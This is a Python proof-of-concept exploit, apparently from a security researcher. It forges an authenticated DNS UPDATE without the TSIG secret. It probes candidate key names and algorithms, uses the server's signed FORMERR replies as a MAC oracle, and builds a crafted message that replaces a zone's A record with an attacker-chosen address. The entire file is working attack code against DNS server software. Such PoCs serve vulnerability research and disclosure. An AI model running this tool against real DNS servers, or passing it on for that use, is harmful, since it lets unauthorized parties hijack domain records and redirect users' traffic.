#!/usr/bin/env python3
# Author Gia Bui <gia@calif.io> from Calif.io

"""Deterministically replace an A RRset without knowing the TSIG secret."""

import argparse
import socket
import struct


ALGORITHMS = (
    "hmac-sha256.",
    "hmac-sha1.",
    "hmac-sha224.",
    "hmac-sha384.",
    "hmac-sha512.",
    "hmac-md5.sig-alg.reg.int.",
)


def dname(text: str) -> bytes:
    labels = text.rstrip(".").split(".") if text.rstrip(".") else []
    if any(len(label) > 63 for label in labels):
        raise ValueError(f"DNS label is too long: {text}")
    wire = b"".join(bytes((len(label),)) + label.encode() for label in labels) + b"\0"
    if len(wire) > 255:
        raise ValueError(f"DNS name is too long: {text}")
    return wire


def skip_name(wire: bytes, offset: int) -> int:
    while True:
        length = wire[offset]
        if length == 0:
            return offset + 1
        if length & 0xC0 == 0xC0:
            return offset + 2
        offset += 1 + length


def rr_end(wire: bytes, offset: int) -> tuple[int, int]:
    name_end = skip_name(wire, offset)
    rrtype = struct.unpack_from("!H", wire, name_end)[0]
    rdlen = struct.unpack_from("!H", wire, name_end + 8)[0]
    return name_end + 10 + rdlen, rrtype


def tsig(key: str, algorithm: str, mac: bytes, signed: int, original_id: int,
         fudge: int = 300, error: int = 0, other: bytes = b"") -> bytes:
    rdata = dname(algorithm) + signed.to_bytes(6, "big")
    rdata += struct.pack("!HH", fudge, len(mac)) + mac
    rdata += struct.pack("!HHH", original_id, error, len(other)) + other
    return dname(key) + struct.pack("!HHIH", 250, 255, 0, len(rdata)) + rdata


def recv_exact(sock: socket.socket, size: int) -> bytes:
    output = bytearray()
    while len(output) < size:
        chunk = sock.recv(size - len(output))
        if not chunk:
            raise EOFError("short DNS/TCP response")
        output += chunk
    return bytes(output)


def exchange(host: str, port: int, wire: bytes, transport: str) -> bytes:
    socktype = socket.SOCK_DGRAM if transport == "udp" else socket.SOCK_STREAM
    with socket.socket(socket.AF_INET, socktype) as sock:
        sock.settimeout(3)
        sock.connect((host, port))
        if transport == "udp":
            sock.send(wire)
            return sock.recv(65535)
        sock.sendall(struct.pack("!H", len(wire)) + wire)
        length = struct.unpack("!H", recv_exact(sock, 2))[0]
        return recv_exact(sock, length)


def oracle_request(zone: str, key: str, algorithm: str, request_mac: bytes) -> bytes:
    ident = 0x4242
    header = struct.pack("!HHHHHH", ident, 5 << 11, 1, 0, 0, 1)
    question = dname(zone) + struct.pack("!HH", 6, 1)
    return header + question + tsig(key, algorithm, request_mac, 0, ident, fudge=0)


def extract_oracle(response: bytes) -> dict:
    if len(response) < 12:
        raise ValueError("short DNS response")
    qd, an, ns, ar = struct.unpack_from("!HHHH", response, 4)
    if response[3] & 15 != 1 or ar == 0:
        raise ValueError("response is not a signed FORMERR")
    offset = 12
    for _ in range(qd):
        offset = skip_name(response, offset) + 4
    tsig_start = None
    for index in range(an + ns + ar):
        start = offset
        offset, rrtype = rr_end(response, offset)
        if index == an + ns + ar - 1 and rrtype == 250:
            tsig_start = start
    if tsig_start is None or offset != len(response):
        raise ValueError("TSIG is not the final response RR")
    owner_end = skip_name(response, tsig_start)
    rdata = owner_end + 10
    algorithm_end = skip_name(response, rdata)
    signed = int.from_bytes(response[algorithm_end:algorithm_end + 6], "big")
    fudge, mac_len = struct.unpack_from("!HH", response, algorithm_end + 6)
    mac_start = algorithm_end + 10
    mac = response[mac_start:mac_start + mac_len]
    _original_id, error, other_len = struct.unpack_from("!HHH", response, mac_start + mac_len)
    other = response[mac_start + mac_len + 6:mac_start + mac_len + 6 + other_len]
    if len(mac) != mac_len or len(other) != other_len:
        raise ValueError("truncated response TSIG")
    unsigned = bytearray(response[:tsig_start])
    unsigned[10:12] = struct.pack("!H", ar - 1)
    return {
        "wire": bytes(unsigned), "signed": signed, "fudge": fudge,
        "mac": mac, "error": error, "other": other,
    }


def rr(owner: str, rrtype: int, rclass: int, ttl: int, rdata: bytes) -> bytes:
    return dname(owner) + struct.pack("!HHIH", rrtype, rclass, ttl, len(rdata)) + rdata


def replacement_updates(owner: str, address: str) -> list[bytes]:
    return [
        rr(owner, 1, 255, 0, b""),
        rr(owner, 1, 1, 300, socket.inet_aton(address)),
    ]


def build_prefix(zone: str, updates: list[bytes], unsigned_response: bytes) -> tuple[bytes, int]:
    question = dname(zone) + struct.pack("!HH", 6, 1)
    body_len = 12 + len(question) + sum(map(len, updates)) + 11
    mac_len = max(200, body_len - 2)
    prefix_len = mac_len + 2
    padding_len = prefix_len - body_len
    carrier_rdlen = padding_len + len(unsigned_response)
    if mac_len > 65535 or carrier_rdlen > 65535:
        raise ValueError("constructed DNS message is too large")
    header = struct.pack("!HHHHHH", mac_len, 5 << 11, 1, 0, len(updates), 1)
    carrier = b"\0" + struct.pack("!HHIH", 65280, 1, 0, carrier_rdlen)
    prefix = header + question + b"".join(updates) + carrier + b"P" * padding_len
    assert len(prefix) == prefix_len
    return prefix, mac_len


def discover(host: str, port: int, transport: str, zone: str,
             keys: list[str]) -> tuple[str, str, bytes, int]:
    attempts = 0
    for key in keys:
        for algorithm in ALGORITHMS:
            attempts += 1
            response = exchange(
                host, port, oracle_request(zone, key, algorithm, b"P" * 200), transport
            )
            try:
                values = extract_oracle(response)
            except ValueError:
                continue
            return key, algorithm, values["wire"], attempts
    raise SystemExit("no candidate selected an UPDATE-authorized TSIG key")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5353)
    parser.add_argument("--zone", default="example.test.")
    parser.add_argument("--key", action="append", default=[])
    parser.add_argument("--owner")
    parser.add_argument("--address", default="13.37.13.37")
    parser.add_argument("--oracle-transport", choices=("udp", "tcp"), default="tcp")
    parser.add_argument("--target-transport", choices=("udp", "tcp"), default="tcp")
    args = parser.parse_args()
    keys = args.key or ["audit-key."]
    owner = args.owner or "www." + args.zone.rstrip(".") + "."
    key, algorithm, observed, attempts = discover(
        args.host, args.port, args.oracle_transport, args.zone, keys
    )
    updates = replacement_updates(owner, args.address)
    for _rebuild in range(3):
        prefix, mac_len = build_prefix(args.zone, updates, observed)
        response = exchange(
            args.host, args.port,
            oracle_request(args.zone, key, algorithm, prefix[2:]),
            args.oracle_transport,
        )
        values = extract_oracle(response)
        if values["wire"] != observed:
            observed = values["wire"]
            continue
        target = bytearray(prefix + values["wire"])
        target[10:12] = struct.pack("!H", 2)
        target += tsig(
            key, algorithm, values["mac"], values["signed"], mac_len,
            values["fudge"], values["error"], values["other"],
        )
        result = exchange(args.host, args.port, target, args.target_transport)
        if len(result) < 4:
            raise SystemExit("short forged-UPDATE response")
        rcode = result[3] & 15
        print(
            f"key={key} algorithm={algorithm} attempts={attempts} clock_input=0 "
            f"response_wire={len(values['wire'])} mac_prefix={mac_len} "
            f"updates={len(updates)} oracle_transport={args.oracle_transport} "
            f"target_transport={args.target_transport} target={len(target)} rcode={rcode}"
        )
        if rcode != 0:
            raise SystemExit("forged UPDATE was rejected")
        return
    raise SystemExit("unsigned oracle response did not stabilize")


if __name__ == "__main__":
    main()
